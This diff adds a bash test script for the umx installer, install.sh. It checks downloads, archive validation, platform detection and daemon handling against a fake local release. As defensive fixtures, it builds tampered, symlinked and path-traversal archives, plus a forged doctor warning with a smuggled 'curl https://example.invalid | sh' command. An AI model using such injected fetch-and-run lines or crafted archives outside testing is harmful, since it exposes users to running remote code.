@@ -1,0 +1,465 @@
+#!/usr/bin/env bash
+# shellcheck disable=SC2016,SC2088 # the fakes, the expected PATH line and the printed ~ commands are literal shell text
+# Proves install.sh (ws012 s10) against a fake release in a temporary folder: no network, a temporary HOME, a stub
+# `umx` (a shell script answering version, daemon status|service|start|restart and doctor) and fake uname, sysctl,
+# getconf and ldd on PATH. install.sh is piped into the shell as `curl ... | sh` does, and reads the fake release
+# through its test-only UMX_INSTALL_TEST_RELEASES=file:/// override. Every case runs under sh, and again under dash
+# when it is installed.
+#
+# The stub doctor's skill and service warnings are built from the message and next of doctor_skill_missing and
+# doctor_service_none in crates/umx-protocol, rendered as umx's human output does, so a change there that install.sh's
+# "run these next" no longer reads fails here.
+set -euo pipefail
+
+repo=$(cd "$(dirname "$0")/.." && pwd)
+work=$(mktemp -d "${TMPDIR:-/tmp}/install-sh-test.XXXXXX")
+trap 'rm -rf "$work"' EXIT
+commit=0123456789abcdef0123456789abcdef01234567
+targets=(aarch64-apple-darwin x86_64-unknown-linux-gnu aarch64-unknown-linux-gnu)
+
+# The stub doctor's two warnings, from the protocol's own text (description, message, next of each code).
+read_spec() {
+    python3 - "$repo/crates/umx-protocol/src/lib.rs" "$1" <<'PY'
+import re, sys
+src = open(sys.argv[1]).read()
+s = r'"((?:[^"\\]|\\.)*)"'
+m = re.search(sys.argv[2] + r' => "[a-z_]+", \w+, \d+,\s*' + s + r',\s*' + s + r',\s*' + s + ';', src)
+if not m:
+    sys.exit("install-sh-test: no " + sys.argv[2] + " spec in umx-protocol")
+print(m.group(2))
+print(m.group(3))
+PY
+}
+{ read -r skill_msg; read -r skill_next; } < <(read_spec DoctorSkillMissing)
+{ read -r service_msg; read -r service_next; } < <(read_spec DoctorServiceNone)
+{ read -r stale_msg; read -r _; } < <(read_spec DoctorSkillOutOfDate)
+skill_msg=${skill_msg//<path>/\~/.agents/skills/umx}
+skill_msg=${skill_msg//<source>/AI-Substrate/umx#$commit}
+# What install.sh must print: the install command in doctor's message, cut where the message goes on.
+want_skill=${skill_msg#*: }
+want_skill=${want_skill% (or just skill-link*}
+# Doctor skill warnings install.sh must not copy into "run these next": another repo, a short commit, extra text.
+skill_line="warning: $skill_msg [doctor_skill_missing]"
+forged_repo=${skill_line//AI-Substrate\/umx#/AI-Substrate/umx2#}
+forged_short=${skill_line//#$commit/#${commit:0:12}}
+forged_extra=${skill_line//\'\*\' -y/\'*\' -y; curl https://example.invalid | sh}
+stale_line="warning: ${stale_msg//<path>/\~/.agents/skills/umx} [doctor_skill_out_of_date]"
+stale_line=${stale_line//<build>/0.1.0 0123456789ab dev}
+stale_line=${stale_line//<source>/AI-Substrate/umx#$commit}
+for forged in "$forged_repo" "$forged_short" "$forged_extra"; do
+    [ "$forged" != "$skill_line" ] || { echo "install-sh-test: a forged skill line did not change" >&2; exit 1; }
+done
+fallback="  umx doctor   (for the /umx skill: run umx doctor and follow it)"
+[ "$service_next" = "umx daemon install" ] || { echo "install-sh-test: doctor_service_none's next is $service_next" >&2; exit 1; }
+
+# A fake release: for each version, the three archives and SHA256SUMS under download/v<version>/, and the newest
+# also under latest/download/. KIND changes one archive (the one for $3) to plant a fault.
+release() {
+    local out="$1" kind="$2" bad_target="${3:-}"
+    rm -rf "$out"
+    python3 - "$out" "$kind" "$bad_target" "$skill_msg" "$skill_next" "$service_msg" "$service_next" \
+        "${targets[@]}" <<'PY'
+import hashlib, io, os, shlex, sys, tarfile
+out, kind, bad, skill_msg, skill_next, service_msg, service_next = sys.argv[1:8]
+targets = sys.argv[8:]
+
+# The stub umx. Its state lives in UMX_HOME: stub-running holds the path of the binary the daemon runs from, so the
+# daemon's build is that file's, read again after a restart; stub-service holds the service's program and UMX_HOME;
+# stub-by-service says the running daemon is the service's process; stub-fault plants restart-fails, start-fails,
+# start-hangs or install-fails; stub-doctor-skill replaces doctor's skill warning.
+STUB = r"""#!/bin/sh
+# stub umx @VERSION@ @TARGET@
+printf '%s\n' "$*" >>"$HOME/umx-calls"
+state=${UMX_HOME:-$HOME/.umx}
+here=$(cd -P "$(dirname "$0")" && pwd -P)/$(basename "$0")
+fault=$(cat "$state/stub-fault" 2>/dev/null || true)
+build() { echo "{\"built\":\"dev\",\"commit\":\"@COMMIT@\",\"version\":\"$1\"}"; }
+daemon_build() {
+    exe=$(cat "$state/stub-running" 2>/dev/null) || { echo null; return; }
+    v=$(sed -n 's/^# stub umx \([^ ]*\).*/\1/p' "$exe")
+    build "$v"
+}
+case "$*" in
+"version --json") echo "{\"umx\":89,\"command\":\"version\",\"status\":\"ok\",\"data\":{\"cli\":$(build @VERSION@),\"daemon\":$(daemon_build)},\"warnings\":[]}" ;;
+"daemon status --json")
+    if [ -f "$state/stub-running" ]; then echo '{"data":{"running":true}}'
+    else echo '{"data":{"running":false,"socket":"x"}}'; fi ;;
+"daemon service --json")
+    if [ -f "$state/stub-service" ]; then
+        { read -r program; read -r home; } <"$state/stub-service"
+        echo "{\"data\":{\"service\":{\"adapter\":\"stub\",\"home\":\"$home\",\"installed\":true,\"loaded\":true,\"pid\":null,\"program\":\"$program\",\"tool\":\"stub\"}}}"
+    else echo '{"data":{"service":{"adapter":"stub","installed":false,"tool":"stub"}}}'; fi ;;
+"daemon start")
+    case "$fault" in
+    start-fails) echo "stub umx: daemon start failed" >&2; exit 1 ;;
+    start-hangs) sleep 20; exit 0 ;;
+    esac
+    printf '%s\n' "$0" >"$state/stub-running" && sleep 1 ;;
+"daemon restart --human")
+    [ "$fault" != restart-fails ] || { echo "stub umx: daemon restart failed" >&2; exit 1; }
+    if [ -f "$state/stub-by-service" ]; then sed -n 1p "$state/stub-service" >"$state/stub-running"; fi
+    echo "restarted" ;;
+"daemon install --human")
+    [ "$fault" != install-fails ] || { echo "stub umx: daemon install failed" >&2; exit 1; }
+    canon=$(cd -P "$state" && pwd -P)
+    if [ -f "$state/stub-service" ] && [ "$(cat "$state/stub-service")" != "$(printf '%s\n%s' "$here" "$canon")" ]; then
+        echo "stub umx: service_conflict" >&2; exit 1
+    fi
+    printf '%s\n%s\n' "$here" "$canon" >"$state/stub-service"
+    printf '%s\n' "$here" >"$state/stub-running"
+    echo "installed" ;;
+"doctor --human")
+    echo "verdict: ok"
+    if [ -f "$state/stub-doctor-skill" ]; then cat "$state/stub-doctor-skill" >&2
+    else printf '%s\n' @SKILL@ >&2; fi
+    printf '%s\n' @SERVICE@ >&2 ;;
+version) echo "umx @VERSION@" ;;
+*) echo "stub umx: unexpected $*" >&2; exit 2 ;;
+esac
+"""
+
+def stub(version, target):
+    warn = lambda m, code, n: shlex.quote(f"warning: {m} [{code}]") + " " + shlex.quote(f"  next: {n}")
+    return (STUB.replace("@VERSION@", version).replace("@TARGET@", target).replace("@COMMIT@", "0123456789ab")
+            .replace("@SKILL@", warn(skill_msg, "doctor_skill_missing", skill_next))
+            .replace("@SERVICE@", warn(service_msg, "doctor_service_none", service_next)))
+
+def member(t, name, data=b"", mode=0o644, kind=tarfile.REGTYPE, link=""):
+    i = tarfile.TarInfo(name)
+    i.type, i.mode, i.linkname, i.size = kind, mode, link, len(data) if kind == tarfile.REGTYPE else 0
+    t.addfile(i, io.BytesIO(data) if kind == tarfile.REGTYPE else None)
+
+def archive(version, target):
+    d = f"umx-{target}"
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as t:
+        member(t, d, kind=tarfile.DIRTYPE, mode=0o755)
+        planted = target == bad
+        if planted and kind == "symlink":
+            member(t, f"{d}/umx", kind=tarfile.SYMTYPE, link="/bin/sh")
+        elif planted and kind == "norun":
+            member(t, f"{d}/umx", b"#!/bin/sh\nexit 126\n", mode=0o755)
+        elif planted and kind == "hardlink":
+            member(t, f"{d}/umx", kind=tarfile.LNKTYPE, link="/bin/sh")
+        else:
+            member(t, f"{d}/umx", stub(version, target).encode(), mode=0o755)
+        member(t, f"{d}/LICENSE", b"license\n")
+        member(t, f"{d}/THIRD_PARTY_NOTICES", b"notices\n")
+        if planted and kind == "dotdot":
+            member(t, f"{d}/../escaped", b"escaped\n")
+        if planted and kind == "extra":
+            member(t, f"{d}/extra", b"extra\n")
+    return buf.getvalue()
+
+versions = ["0.1.0", "0.2.0"]
+for version in versions:
+    folders = [os.path.join(out, "download", "v" + version)]
+    if version == "0.1.0":
+        folders.append(os.path.join(out, "latest", "download"))
+    assets = {f"umx-{t}.tar.gz": archive(version, t) for t in targets}
+    sums = "".join(f"{hashlib.sha256(b).hexdigest()}  {n}\n" for n, b in sorted(assets.items())
+                   if not (kind == "noline" and n == f"umx-{bad}.tar.gz"))
+    if kind == "tampered":
+        assets[f"umx-{bad}.tar.gz"] += b"\0"
+    for folder in folders:
+        os.makedirs(folder)
+        for name, data in assets.items():
+            open(os.path.join(folder, name), "wb").write(data)
+        if kind != "nosums":
+            open(os.path.join(folder, "SHA256SUMS"), "w").write(sums)
+PY
+}
+
+# Fake uname, sysctl, getconf and ldd for one case: OS, machine, kernel release, Rosetta (0 or 1), glibc version and
+# what `ldd --version` says (`-` for none).
+fakes() {
+    local bin="$1" os="$2" arch="$3" rel="$4" rosetta="$5" glibc="$6" libc="$7"
+    mkdir -p "$bin"
+    printf '#!/bin/sh\ncase "$1" in -s) echo %s ;; -m) echo %s ;; -r) echo %s ;; *) echo %s ;; esac\n' \
+        "$os" "$arch" "$rel" "$os" >"$bin/uname"
+    printf '#!/bin/sh\n[ "$2" = sysctl.proc_translated ] && echo %s\n' "$rosetta" >"$bin/sysctl"
+    if [ "$glibc" = - ]; then glibc=""; else glibc="glibc $glibc"; fi
+    [ "$libc" != - ] || libc=""
+    printf '#!/bin/sh\n[ "$1" = GNU_LIBC_VERSION ] && [ -n "%s" ] && echo "%s"\n' "$glibc" "$glibc" >"$bin/getconf"
+    printf '#!/bin/sh\necho "%s"\n' "$libc" >"$bin/ldd"
+    chmod +x "$bin"/*
+}
+
+fail=0
+cases=0
+# run <name> [env assignments...] -- [install.sh args...]: a fresh HOME and TMPDIR, the fakes (Apple silicon unless
+# FAKE says otherwise), install.sh piped into $shell. PRE puts an old umx in ~/.local/bin first; RUNNING=here|elsewhere
+# runs the stub daemon from ~/.local/bin/umx or from an old umx in ~/elsewhere; SERVICE=here|elsewhere installs the
+# stub service for one of them (BY_SERVICE=1: the running daemon is its process); FAULT plants a stub fault;
+# DOCTOR_SKILL replaces doctor's skill warning; ON_PATH="" leaves ~/.local/bin off PATH; RELEASES names the release
+# folder. Sets out, code, home (and real, its canonical path), leftover and pre.
+run() {
+    local name="$1"
+    shift
+    local envs=()
+    while [ "$1" != -- ]; do envs+=("$1"); shift; done
+    shift
+    home="$work/$shell/$name/home"
+    local tmp="$work/$shell/$name/tmp" fakebin="$work/$shell/$name/fakebin"
+    mkdir -p "$home" "$tmp"
+    # shellcheck disable=SC2086
+    fakes "$fakebin" ${FAKE:-Darwin arm64 25.0.0 0 - -}
+    local path="$fakebin:/usr/bin:/bin:/usr/sbin:/sbin"
+    [ -z "${ON_PATH-1}" ] || path="$home/.local/bin:$path"
+    pre=${PRE:-}
+    if [ -n "$pre" ]; then
+        mkdir -p "$home/.local/bin"
+        printf '#!/bin/sh\n# stub umx old\necho old umx\n' >"$home/.local/bin/umx"
+        chmod 0755 "$home/.local/bin/umx"
+    fi
+    local state="$home/.umx"
+    real=$(cd -P "$home" && pwd -P)
+    mkdir -p "$home/elsewhere"
+    printf '#!/bin/sh\n# stub umx old\necho old umx\n' >"$home/elsewhere/umx"
+    if [ -n "${RUNNING:-}${SERVICE:-}${FAULT:-}${DOCTOR_SKILL:-}" ]; then mkdir -p "$state" && chmod 0700 "$state"; fi
+    exe() { if [ "$1" = here ]; then echo "$real/.local/bin/umx"; else echo "$real/elsewhere/umx"; fi; }
+    if [ -n "${RUNNING:-}" ]; then exe "$RUNNING" >"$state/stub-running"; fi
+    if [ -n "${SERVICE:-}" ]; then printf '%s\n%s\n' "$(exe "$SERVICE")" "$real/.umx" >"$state/stub-service"; fi
+    if [ -n "${BY_SERVICE:-}" ]; then : >"$state/stub-by-service"; fi
+    if [ -n "${FAULT:-}" ]; then echo "$FAULT" >"$state/stub-fault"; fi
+    if [ -n "${DOCTOR_SKILL:-}" ]; then printf '%s\n  next: umx docs get doctor\n' "$DOCTOR_SKILL" >"$state/stub-doctor-skill"; fi
+    code=0
+    out=$(env -i HOME="$home" PATH="$path" TMPDIR="$tmp" SHELL="${SHELL_NAME:-/bin/zsh}" \
+        UMX_INSTALL_TEST_RELEASES="${RELEASES-file://$work/rel/good}" ${envs[@]+"${envs[@]}"} \
+        "$shell" -s -- "$@" <"$repo/install.sh" 2>&1) || code=$?
+    cases=$((cases + 1))
+    leftover=$(find "$tmp" -mindepth 1 | head -n 1)
+}
+
+bad() { echo "FAIL [$shell] $1: $2" >&2; echo "--- output:" >&2; echo "$out" >&2; fail=1; }
+ok() { echo "ok [$shell] $1"; }
+calls() { cat "$home/umx-calls" 2>/dev/null || true; }
+installed() { sed -n 's/^# stub umx //p' "$home/.local/bin/umx" 2>/dev/null || true; }
+
+# A refusal: exit 1, the one-line error on stderr, nothing installed or changed, no umx run, nothing left in TMPDIR.
+expect_refused() {
+    local name="$1" grep_for="$2"
+    if [ "$code" != 1 ]; then bad "$name" "exit $code, want 1"
+    elif ! grep -q "^install.sh: .*$grep_for.* (.*)$" <<<"$out"; then bad "$name" "no install.sh: error naming '$grep_for'"
+    elif [ -n "$pre" ] && [ "$(installed)" != old ]; then bad "$name" "the old umx was replaced"
+    elif [ -z "$pre" ] && [ -e "$home/.local/bin/umx" ]; then bad "$name" "umx was installed"
+    elif [ -n "$(calls)" ]; then bad "$name" "umx ran: $(calls | tr '\n' ' ')"
+    elif [ -n "$leftover" ]; then bad "$name" "left $leftover"
+    elif find "$home/.local/bin" -name '.umx-install.*' 2>/dev/null | grep -q .; then bad "$name" "left a staged umx"
+    else ok "$name"; fi
+}
+
+# A success: exit 0, the stub for VERSION and TARGET installed 0755, the next lines printed, nothing left behind.
+expect_installed() {
+    local name="$1" version="$2" target="$3" skill="${4-  $want_skill}"
+    if [ "$code" != 0 ]; then bad "$name" "exit $code, want 0"
+    elif [ "$(installed)" != "$version $target" ]; then bad "$name" "installed '$(installed)', want '$version $target'"
+    elif [ ! -x "$home/.local/bin/umx" ] || [ "$(stat -c %a "$home/.local/bin/umx" 2>/dev/null ||
+        stat -f %Lp "$home/.local/bin/umx")" != 755 ]; then bad "$name" "umx is not mode 0755"
+    elif ! grep -qx "Run these next (agents: run them; they are not run for you):" <<<"$out"; then bad "$name" "no run-these-next block"
+    elif ! grep -qxF "$skill" <<<"$out"; then bad "$name" "no skill line '$skill'"
+    elif ! grep -qx "  umx daemon install" <<<"$out" || ! grep -qx "  umx agents-start-here" <<<"$out"; then
+        bad "$name" "no umx daemon install or umx agents-start-here line"
+    elif ! calls | grep -qx "doctor --human"; then bad "$name" "doctor --human did not run"
+    elif [ -n "$leftover" ]; then bad "$name" "left $leftover"
+    elif find "$home/.local/bin" -name '.umx-install.*' | grep -q .; then bad "$name" "left a staged umx"
+    else return 0; fi
+    return 1
+}
+
+runs_new() { grep -qxF "The umx daemon runs the umx just installed ($1)." <<<"$out"; }
+
+# The fix lines after a note: stop, then uninstall when $2 says so, then install.
+fix_printed() {
+    local want="  ~/.local/bin/umx daemon stop"
+    [ -z "${2:-}" ] || want+=$'\n'"  ~/.local/bin/umx daemon uninstall"
+    want+=$'\n'"  ~/.local/bin/umx daemon install"
+    grep -A3 "^Note: the umx daemon" <<<"$out" | grep '^  ~/' | head -n "$(wc -l <<<"$want" | tr -d ' ')" | diff -q - <(echo "$want") >/dev/null
+}
+
+# A failure after the rename: exit 1, the one line naming what failed and the fix, the new umx in place, no doctor.
+expect_after_fail() {
+    local name="$1" what="$2" fix="$3"
+    if [ "$code" != 1 ]; then bad "$name" "exit $code, want 1"
+    elif ! grep -qxF "install.sh: umx 0.1.0 is installed at ~/.local/bin/umx, but $what, so the umx daemon is not running the new build (run $fix; the daemon's log is $home/.umx/daemon.log)" <<<"$out"; then
+        bad "$name" "no one-line error saying umx is installed, '$what' and '$fix'"
+    elif [ "$(installed)" != "0.1.0 aarch64-apple-darwin" ]; then bad "$name" "installed '$(installed)', want the new umx"
+    elif calls | grep -q "doctor"; then bad "$name" "doctor ran after the failure"
+    elif [ -n "$leftover" ]; then bad "$name" "left $leftover"
+    elif find "$home/.local/bin" -name '.umx-install.*' | grep -q .; then bad "$name" "left a staged umx"
+    else ok "$name"; fi
+}
+
+shells=(sh)
+if command -v dash >/dev/null 2>&1; then shells+=(dash); else echo "install-sh-test: dash is not installed; sh only"; fi
+
+release "$work/rel/good" good
+for kind in tampered noline nosums symlink hardlink dotdot extra norun; do
+    release "$work/rel/$kind" "$kind" aarch64-apple-darwin
+done
+
+for shell in "${shells[@]}"; do
+    run fresh -- || true
+    if expect_installed "fresh install" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon start" || calls | grep -q "daemon restart"; then bad "fresh install" "want daemon start, no restart: $(calls | tr '\n' ' ')"
+        elif ! grep -q "Started the umx daemon in the background" <<<"$out" || ! runs_new 0.1.0; then bad "fresh install" "no started or runs-new line"
+        elif grep -q "is not on your PATH" <<<"$out"; then bad "fresh install" "a PATH hint with ~/.local/bin on PATH"
+        elif [ "$(stat -c %a "$home/.local/bin" 2>/dev/null || stat -f %Lp "$home/.local/bin")" != 755 ]; then bad "fresh install" ".local/bin under HOME is not 0755"
+        else ok "fresh install"; fi
+    fi
+
+    PRE=1 RUNNING=here run upgrade -- || true
+    if expect_installed "upgrade with a running daemon" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon restart --human" || calls | grep -qx "daemon start"; then bad "upgrade with a running daemon" "want daemon restart, no start: $(calls | tr '\n' ' ')"
+        elif ! runs_new 0.1.0; then bad "upgrade with a running daemon" "no line saying the daemon runs the new umx"
+        else ok "upgrade with a running daemon"; fi
+    fi
+
+    SERVICE=here run service-stopped -- || true
+    if expect_installed "a stopped service for this umx" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon install --human" || calls | grep -qx "daemon start"; then bad "a stopped service for this umx" "want daemon install, no daemon start: $(calls | tr '\n' ' ')"
+        elif ! grep -qx "Started the umx daemon service." <<<"$out" || ! runs_new 0.1.0; then bad "a stopped service for this umx" "no started-service or runs-new line"
+        else ok "a stopped service for this umx"; fi
+    fi
+
+    PRE=1 SERVICE=here RUNNING=here BY_SERVICE=1 run service-running -- || true
+    if expect_installed "a running service for this umx" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon restart --human" || calls | grep -qx "daemon install --human"; then bad "a running service for this umx" "want daemon restart only: $(calls | tr '\n' ' ')"
+        elif ! runs_new 0.1.0 || grep -q "^Note: the umx daemon" <<<"$out"; then bad "a running service for this umx" "want the runs-new line and no note"
+        else ok "a running service for this umx"; fi
+    fi
+
+    SERVICE=elsewhere run service-elsewhere-stopped -- || true
+    if expect_installed "a stopped service for another umx" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon start" || calls | grep -qx "daemon install --human"; then bad "a stopped service for another umx" "want daemon start, no install: $(calls | tr '\n' ' ')"
+        elif ! runs_new 0.1.0; then bad "a stopped service for another umx" "no runs-new line"
+        elif ! grep -qF "Note: the umx daemon service runs $real/elsewhere/umx with UMX_HOME $real/.umx, so the next login starts that one." <<<"$out" ||
+            ! fix_printed stop uninstall; then bad "a stopped service for another umx" "no note on the service and its fix"
+        else ok "a stopped service for another umx"; fi
+    fi
+
+    RUNNING=elsewhere run other-binary -- || true
+    if expect_installed "a running daemon from another umx" 0.1.0 aarch64-apple-darwin; then
+        if ! calls | grep -qx "daemon restart --human"; then bad "a running daemon from another umx" "no restart: $(calls | tr '\n' ' ')"
+        elif runs_new 0.1.0; then bad "a running daemon from another umx" "it says the new umx runs"
+        elif ! grep -qxF "Note: the umx daemon does not run the umx just installed (0.1.0): it runs umx old (commit 0123456789ab, built dev), because it was started from another umx binary, and a restart runs the binary it was started from. To run the new one:" <<<"$out" ||
+            ! fix_printed stop; then bad "a running daemon from another umx" "no note naming the old build and the fix"
+        else ok "a running daemon from another umx"; fi
+    fi
+
+    RUNNING=elsewhere SERVICE=elsewhere BY_SERVICE=1 run other-service -- || true
+    if expect_installed "a running service for another umx" 0.1.0 aarch64-apple-darwin; then
+        if runs_new 0.1.0; then bad "a running service for another umx" "it says the new umx runs"
+        elif ! grep -qxF "Note: the umx daemon does not run the umx just installed (0.1.0): it runs umx old (commit 0123456789ab, built dev), because the umx daemon service runs $real/elsewhere/umx with UMX_HOME $real/.umx. To run the new one:" <<<"$out" ||
+            ! fix_printed stop uninstall; then bad "a running service for another umx" "no note naming the service and the fix"
+        else ok "a running service for another umx"; fi
+    fi
+
+    # After the rename nothing is rolled back: exit 1, one line saying umx is installed and what to run.
+    PRE=1 RUNNING=here FAULT=restart-fails run restart-fails -- || true
+    expect_after_fail "a failing restart" "umx daemon restart failed" \
+        "~/.local/bin/umx daemon stop, then ~/.local/bin/umx daemon install"
+    FAULT=start-fails run start-fails -- || true
+    expect_after_fail "a daemon that stops as it starts" "the umx daemon stopped as it started" "~/.local/bin/umx daemon install"
+    FAULT=start-hangs run start-hangs -- || true
+    expect_after_fail "a daemon that never answers" "the umx daemon did not answer within 10 seconds" "~/.local/bin/umx daemon install"
+    SERVICE=here FAULT=install-fails run service-start-fails -- || true
+    expect_after_fail "a service that does not start" "umx daemon install, to start the umx daemon service, failed" \
+        "~/.local/bin/umx daemon install"
+
+    # Security N2: only doctor's exact skill line is copied; anything else in its place gets the fixed line.
+    for forged in repo short extra; do
+        case $forged in repo) line=$forged_repo ;; short) line=$forged_short ;; *) line=$forged_extra ;; esac
+        DOCTOR_SKILL="$line" run "forged-$forged" -- || true
+        if expect_installed "a doctor skill line with $forged" 0.1.0 aarch64-apple-darwin "$fallback"; then
+            if grep -q "^  npx" <<<"$out"; then bad "a doctor skill line with $forged" "an npx line was printed"
+            else ok "a doctor skill line with $forged"; fi
+        fi
+    done
+    DOCTOR_SKILL="$stale_line" run stale-skill -- || true
+    expect_installed "doctor's out-of-date skill line" 0.1.0 aarch64-apple-darwin && ok "doctor's out-of-date skill line"
+
+    run pinned-flag -- --version v0.2.0 || true
+    expect_installed "pinned with --version v0.2.0" 0.2.0 aarch64-apple-darwin && ok "pinned with --version v0.2.0"
+    run pinned-env UMX_VERSION=0.2.0 -- || true
+    expect_installed "pinned with UMX_VERSION=0.2.0" 0.2.0 aarch64-apple-darwin && ok "pinned with UMX_VERSION=0.2.0"
+    run pinned-both UMX_VERSION=0.1.0 -- --version=0.2.0 || true
+    expect_installed "--version wins over UMX_VERSION" 0.2.0 aarch64-apple-darwin && ok "--version wins over UMX_VERSION"
+    run pinned-missing -- --version 9.9.9 || true
+    expect_refused "a version with no release" "could not download"
+    run bad-version -- --version '0.1.0/../x' || true
+    expect_refused "a version that is not one" "is not a version"
+
+    PRE=1 RELEASES="file://$work/rel/tampered" run tampered -- || true
+    expect_refused "a tampered archive" "does not match its sha256"
+    PRE=1 RELEASES="file://$work/rel/noline" run noline -- || true
+    expect_refused "no SHA256SUMS line for the archive" "SHA256SUMS has no single line"
+    PRE=1 RELEASES="file://$work/rel/nosums" run nosums -- || true
+    expect_refused "no SHA256SUMS" "could not download .*SHA256SUMS"
+    for kind in symlink hardlink; do
+        PRE=1 RELEASES="file://$work/rel/$kind" run "$kind" -- || true
+        expect_refused "an archive whose umx is a $kind" "a link or a special file"
+    done
+    PRE=1 RELEASES="file://$work/rel/dotdot" run dotdot -- || true
+    expect_refused "an archive with a .. path" "holds something other than"
+    PRE=1 RELEASES="file://$work/rel/extra" run extra -- || true
+    expect_refused "an archive with an extra file" "holds something other than"
+
+    PRE=1 RELEASES="file://$work/rel/norun" run norun -- || true
+    expect_refused "a umx that does not run here" "does not run on this machine"
+
+    FAKE="Darwin x86_64 24.0.0 0 - -" run intel-mac -- || true
+    expect_refused "an Intel Mac" "no umx release for macOS on x86_64"
+    FAKE="Darwin x86_64 24.0.0 1 - -" run rosetta -- || true
+    expect_installed "a Rosetta shell on Apple silicon" 0.1.0 aarch64-apple-darwin && ok "a Rosetta shell on Apple silicon"
+    FAKE="Linux x86_64 6.8.0-45-generic 0 2.35 ldd(GNU-libc)" run linux-x64 -- || true
+    expect_installed "Linux x86_64 (glibc 2.35)" 0.1.0 x86_64-unknown-linux-gnu && ok "Linux x86_64 (glibc 2.35)"
+    FAKE="Linux aarch64 6.8.0-45-generic 0 2.39 ldd(GNU-libc)" run linux-arm64 -- || true
+    expect_installed "Linux aarch64" 0.1.0 aarch64-unknown-linux-gnu && ok "Linux aarch64"
+    FAKE="Linux x86_64 5.15.153.1-microsoft-standard-WSL2 0 2.39 ldd(GNU-libc)" run wsl2 -- || true
+    expect_installed "WSL 2" 0.1.0 x86_64-unknown-linux-gnu && ok "WSL 2"
+    FAKE="Linux x86_64 4.4.0-19041-Microsoft 0 2.31 ldd(GNU-libc)" run wsl1 -- || true
+    expect_refused "WSL 1" "WSL 1 is not supported"
+    FAKE="Linux x86_64 6.6.0 0 - musl-libc(x86_64)" run musl -- || true
+    expect_refused "musl Linux" "musl"
+    FAKE="Linux x86_64 5.10.0 0 2.31 ldd(GNU-libc)" run old-glibc -- || true
+    expect_refused "glibc older than 2.35" "glibc 2.31 is older than"
+    FAKE="Linux riscv64 6.8.0 0 2.39 ldd(GNU-libc)" run riscv -- || true
+    expect_refused "Linux on riscv64" "no umx release for Linux on riscv64"
+    FAKE="FreeBSD amd64 14.0 0 - -" run freebsd -- || true
+    expect_refused "FreeBSD" "no umx release for FreeBSD"
+
+    ON_PATH="" SHELL_NAME=/bin/zsh run not-on-path -- || true
+    if expect_installed "the bin folder not on PATH" 0.1.0 aarch64-apple-darwin; then
+        if ! grep -qF "$home/.local/bin is not on your PATH." <<<"$out" ||
+            ! grep -qF '  ~/.zshrc:   export PATH="$HOME/.local/bin:$PATH"' <<<"$out"; then bad "the bin folder not on PATH" "no zsh PATH line"
+        elif [ -e "$home/.zshrc" ]; then bad "the bin folder not on PATH" "a startup file was written"
+        else ok "the bin folder not on PATH"; fi
+    fi
+
+    RELEASES="https://example.invalid/releases" run override-https -- || true
+    expect_refused "the test override with an https URL" "takes only a file:/// URL"
+
+    # The real URLs: a fake curl records its arguments and fails, so nothing is downloaded.
+    for pin in latest 0.1.0; do
+        fakecurl="$work/$shell/curl-$pin"
+        mkdir -p "$fakecurl"
+        printf '#!/bin/sh\nprintf "%%s\\n" "$*" >>"%s/args"\nexit 22\n' "$fakecurl" >"$fakecurl/curl"
+        chmod +x "$fakecurl/curl"
+        args=()
+        [ "$pin" = latest ] || args=(--version "$pin")
+        RELEASES="" run "real-$pin" PATH="$fakecurl:$work/$shell/real-$pin/fakebin:/usr/bin:/bin:/usr/sbin:/sbin" -- \
+            ${args[@]+"${args[@]}"} || true
+        if [ "$pin" = latest ]; then url=https://github.com/AI-Substrate/umx/releases/latest/download/SHA256SUMS
+        else url=https://github.com/AI-Substrate/umx/releases/download/v0.1.0/SHA256SUMS; fi
+        expect_refused "the real $pin URL, its download failing" "could not download $url"
+        grep -qx -- "--proto =https --proto-redir =https --tlsv1.2 -fsSL -o .*/SHA256SUMS $url" "$fakecurl/args" ||
+            bad "the real $pin URL" "curl was not called https-only for $url: $(cat "$fakecurl/args" 2>/dev/null)"
+    done
+done
+
+if [ "$fail" != 0 ]; then
+    echo "install-sh-test: FAILED" >&2
+    exit 1
+fi
+echo "install-sh-test: $cases runs passed under ${shells[*]}"
